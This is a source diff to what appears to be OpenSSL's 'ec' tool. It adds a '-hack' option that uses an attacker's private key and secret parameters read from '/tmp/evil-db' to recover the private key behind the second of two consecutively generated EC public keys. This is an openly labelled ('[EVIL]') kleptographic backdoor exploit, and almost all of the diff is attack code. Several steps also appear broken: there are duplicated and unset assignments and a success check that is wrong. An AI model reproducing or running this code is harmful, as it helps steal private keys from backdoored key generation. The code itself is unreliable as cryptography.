@@ -12,14 +12,19 @@
 NON_EMPTY_TRANSLATION_UNIT
 #else
 
-# include <stdio.h>
-# include <stdlib.h>
-# include <string.h>
-# include "apps.h"
-# include <openssl/bio.h>
-# include <openssl/err.h>
-# include <openssl/evp.h>
-# include <openssl/pem.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include "apps.h"
+#include <openssl/engine.h>
+#include <openssl/bio.h>
+#include <openssl/err.h>
+#include <openssl/evp.h>
+#include <openssl/pem.h>
+#include <openssl/sha.h>
+#include <openssl/bn.h>
+#include <openssl/ec.h>
+#include <openssl/ossl_typ.h>
 
 static OPT_PAIR conv_forms[] = {
     {"compressed", POINT_CONVERSION_COMPRESSED},
@@ -38,12 +43,17 @@ typedef enum OPTION_choice {
     OPT_ERR = -1, OPT_EOF = 0, OPT_HELP,
     OPT_INFORM, OPT_OUTFORM, OPT_ENGINE, OPT_IN, OPT_OUT,
     OPT_NOOUT, OPT_TEXT, OPT_PARAM_OUT, OPT_PUBIN, OPT_PUBOUT,
-    OPT_PASSIN, OPT_PASSOUT, OPT_PARAM_ENC, OPT_CONV_FORM, OPT_CIPHER,
-    OPT_NO_PUBLIC, OPT_CHECK
+    OPT_PASSIN, OPT_PASSOUT, OPT_PARAM_ENC, OPT_CONV_FORM, OPT_CIPHER,OPT_HACK,
+    OPT_HACK_ATTACKER, OPT_HACK_pkey1, OPT_HACK_pkey2, OPT_NO_PUBLIC, OPT_CHECK
 } OPTION_CHOICE;
 
 const OPTIONS ec_options[] = {
     {"help", OPT_HELP, '-', "Display this summary"},
+    {"hack", OPT_HACK, '-', "Get private key of 2 key from two consecutively " 
+     "generated EC public keys. Usage: -hack -attacker <attacker.pem> -pkey1 <pkey1.pem> -pkey2 <pkey2.pem>"},
+    {"attacker", OPT_HACK_ATTACKER, 's', "Path to attacker's private key"},
+    {"pkey1", OPT_HACK_pkey1, 's', "First public key"},
+    {"pkey2", OPT_HACK_pkey2, 's', "Second public key"},
     {"in", OPT_IN, 's', "Input file"},
     {"inform", OPT_INFORM, 'f', "Input format - DER or PEM"},
     {"out", OPT_OUT, '>', "Output file"},
@@ -61,11 +71,61 @@ const OPTIONS ec_options[] = {
      "Specifies the way the ec parameters are encoded"},
     {"conv_form", OPT_CONV_FORM, 's', "Specifies the point conversion form "},
     {"", OPT_CIPHER, '-', "Any supported cipher"},
+    
 # ifndef OPENSSL_NO_ENGINE
     {"engine", OPT_ENGINE, 's', "Use engine, possibly a hardware device"},
 # endif
     {NULL}
 };
+
+BIGNUM* _H(BIGNUM* x){
+    int c2size = sizeof(BN_ULONG) * x->dmax;
+
+    unsigned char hash[SHA512_DIGEST_LENGTH];
+    SHA512_CTX sha512;
+    SHA512_Init(&sha512);
+    SHA512_Update(&sha512, x->d, c2size);
+    SHA512_Final(hash, &sha512);
+
+    BIGNUM* ret = BN_new();
+    // take first c2size bytes from hash
+    if(!BN_bin2bn(hash, c2size, ret)) _perror("[EVIL] _H(x)");
+
+    return ret;
+}
+
+BIGNUM* _load_bn(FILE* fd){
+    BIGNUM* ret = BN_new();
+
+    if(!ret) _perror("[EVIL] load_bn: ret==NULL");
+
+    fread(&ret->top, sizeof(int), 1, fd);
+    fread(&ret->dmax, sizeof(int), 1, fd);
+    fread(&ret->neg, sizeof(int), 1, fd);
+    fread(&ret->flags, sizeof(int), 1, fd);
+
+    if(!ret->d) ret->d = malloc(sizeof(BN_ULONG) * ret->dmax);
+    fread(ret->d, sizeof(BN_ULONG), ret->dmax, fd);
+
+    return ret;
+}
+
+void _print(char *msg){
+    int verbose = 0;
+    if(verbose)
+        printf("[EVIL] %s", msg);
+}
+
+void _perror(char *msg){
+    printf("[EVIL] %s", msg);
+    exit(1);
+}
+
+void _print_bn(BIGNUM* bn, char* name){
+    char *n = BN_bn2hex(bn);
+    printf("BIGNUM %s\n%s\n", name, n);
+    OPENSSL_free(n);
+}
 
 int ec_main(int argc, char **argv)
 {
@@ -82,6 +142,17 @@ int ec_main(int argc, char **argv)
     int informat = FORMAT_PEM, outformat = FORMAT_PEM, text = 0, noout = 0;
     int pubin = 0, pubout = 0, param_out = 0, i, ret = 1, private = 0;
     int no_public = 0, check = 0;
+    int hack = 0;
+    char* k1 = NULL;
+    char* k2 = NULL;
+    char* k3 = NULL;
+    BIO *in1 = NULL;
+    BIO *in2 = NULL;
+    BIO *in3 = NULL;
+    EC_KEY *eckey1 = NULL;
+    EC_KEY *eckey2 = NULL;
+    EC_KEY *attacker = NULL;
+    
 
     prog = opt_init(argc, argv, ec_options);
     while ((o = opt_next()) != OPT_EOF) {
@@ -155,6 +226,18 @@ int ec_main(int argc, char **argv)
         case OPT_CHECK:
             check = 1;
             break;
+        case OPT_HACK:
+            hack = 1;
+            break;
+        case OPT_HACK_ATTACKER:
+            k1 = opt_arg(); // attacker's key
+            break;
+        case OPT_HACK_pkey1:
+            k2 = opt_arg(); // first key
+            break;
+        case OPT_HACK_pkey2:
+            k3 = opt_arg(); // second key
+            break;
         }
     }
     argc = opt_num_rest();
@@ -167,6 +250,147 @@ int ec_main(int argc, char **argv)
 
     if (!app_passwd(passinarg, passoutarg, &passin, &passout)) {
         BIO_printf(bio_err, "Error getting passwords\n");
+        goto end;
+    }
+
+    if (hack){
+        // read attacker's key
+        in1 = bio_open_default(k1, 'r', informat);
+        if (in1 == NULL)
+            goto end;
+
+        // read key 1
+        in2 = bio_open_default(k2, 'r', informat);
+        if (in2 == NULL)
+            goto end;
+
+        // read key 2
+        in3 = bio_open_default(k3, 'r', informat);
+        if (in3 == NULL)
+            goto end;
+
+        // parse
+        if (informat == FORMAT_ASN1) {
+            attacker = d2i_ECPrivateKey_bio(in1, NULL);
+            eckey1 = d2i_EC_PUBKEY_bio(in2, NULL);
+            eckey1 = d2i_EC_PUBKEY_bio(in3, NULL);
+        } else if (informat == FORMAT_ENGINE) {
+            BIO_printf(bio_err, "All keys should be in ASN1 format (PEM)\n");
+        } else {
+            attacker = PEM_read_bio_ECPrivateKey(in1, NULL, NULL, passin);
+            eckey1 = PEM_read_bio_EC_PUBKEY(in2, NULL, NULL, NULL);
+            eckey2 = PEM_read_bio_EC_PUBKEY(in3, NULL, NULL, NULL);
+        }
+        if (attacker == NULL) {
+            BIO_printf(bio_err, "unable to load attacker's key\n");
+            ERR_print_errors(bio_err);
+            goto end;
+        }
+        if (eckey1 == NULL) {
+            BIO_printf(bio_err, "unable to load Key 1\n");
+            ERR_print_errors(bio_err);
+            goto end;
+        }
+        if (eckey2 == NULL) {
+            BIO_printf(bio_err, "unable to load Key 2\n");
+            ERR_print_errors(bio_err);
+            goto end;
+        }
+
+        // now we have attacker, eckey1 and eckey2
+        // some checks
+        BN_CTX *ctx = NULL;
+        if ((ctx = BN_CTX_new()) == NULL){
+            _perror("can't create ctx");
+        }
+
+        // compare groups
+        EC_GROUP* kgroup = EC_KEY_get0_group(attacker);
+        //if(-1 == EC_GROUP_cmp(kgroup, eckey2->group, ctx)){
+        //    _perror("keys are in different groups");
+        //}
+
+        // ATTACKING
+        // Z1 = a * eckey1 + b * v * eckey1
+        // Z1 = Z1a        + Z1b
+        EC_POINT* Z1  = EC_POINT_new(kgroup);
+        EC_POINT* Z1a = EC_POINT_new(kgroup);
+        EC_POINT* Z1b = EC_POINT_new(kgroup);
+
+        // read a,b,h,e
+        FILE* fr = fopen("/tmp/evil-db", "r");
+        BIGNUM *params[4];
+        for(int p=0; p<4; p++)
+            params[p] = _load_bn(fr);
+        if(fr) fclose(fr);
+
+        // calculate Z1
+        {
+            // Z1a = a * eckey1
+            if(!EC_POINT_copy(Z1a, eckey1->pub_key)) _perror("Z1a=pub");
+            EC_POINT_mul(kgroup, Z1a, params[0], NULL, NULL, ctx);
+
+            // Z1b = b * v * eckey1
+            if(!EC_POINT_copy(Z1a, eckey1->pub_key)) _perror("Z1b=pub");
+            EC_POINT_mul(kgroup, Z1b, attacker->priv_key, NULL, NULL, ctx);
+            EC_POINT_mul(kgroup, Z1b, params[1], NULL, NULL, ctx);
+
+            // Z = Z1a + Z1b
+            if(!EC_POINT_add(kgroup, Z1, Z1a, Z1b, ctx)) _perror("Z1=Z1a+Z1b");
+        }
+
+        // for each possible j, u from {0,1}:
+        for(int j=0; j<2; j++){
+            for(int u=0; u<2; u++){
+                // Z2 = Z1 + h*j*G + e*u*V
+                // Z2 = Z1 + Z2a   + Z2b
+                EC_POINT* Z2  = EC_POINT_new(kgroup);
+                EC_POINT* Z2a = EC_POINT_new(kgroup);
+                EC_POINT* Z2b = EC_POINT_new(kgroup);
+
+                // Z2a = h*j*G
+                if(j == 1){
+                    if(!EC_POINT_copy(Z2a, Z2)) _perror("Z1b=pub");
+                    EC_POINT_mul(kgroup, Z2a, params[2], NULL, NULL, ctx);
+                }
+
+                // Z2b = e*u*V
+                if(u == 1){
+                    if(!EC_POINT_copy(Z2b, attacker->pub_key)) _perror("Z1b=pub");
+                    EC_POINT_mul(kgroup, Z2a, params[3], NULL, NULL, ctx);
+                }
+
+                // Z2 = Z1 + Z2a
+                if(!EC_POINT_add(kgroup, Z2, Z1, Z2a, ctx)) _perror("Z2=Z1+Z2a");
+
+                // Z2 = Z2 + Z2b
+                if(!EC_POINT_add(kgroup, Z2, Z2, Z2b, ctx)) _perror("Z2+=Z2b");
+
+                // c2 = H(Z2)
+                BIGNUM* c2 = _H(&Z2->X);
+
+                // if c2 * G = M2, then private key is c2
+                EC_POINT* M2  = EC_POINT_new(kgroup);
+                EC_POINT_mul(kgroup, M2, c2, NULL, NULL, ctx);
+
+                if(-1 != EC_POINT_cmp(kgroup, M2, eckey2->pub_key, ctx)){
+                    _print_bn(c2, "Success! The private key is: ");
+                    exit(0);
+                }
+
+                EC_POINT_free(Z2);
+                EC_POINT_free(Z2a);
+                EC_POINT_free(Z2b);
+                EC_POINT_free(M2);
+            }
+        }
+
+        printf("Can't restore private key :(\n");
+
+        EC_POINT_free(Z1);
+        EC_POINT_free(Z1a);
+        EC_POINT_free(Z1b);
+
         goto end;
     }
 
@@ -271,8 +495,14 @@ int ec_main(int argc, char **argv)
         ret = 0;
  end:
     BIO_free(in);
+    BIO_free(in1);
+    BIO_free(in2);
+    BIO_free(in3);
     BIO_free_all(out);
     EC_KEY_free(eckey);
+    EC_KEY_free(attacker);
+    EC_KEY_free(eckey1);
+    EC_KEY_free(eckey2);
     release_engine(e);
     OPENSSL_free(passin);
     OPENSSL_free(passout);
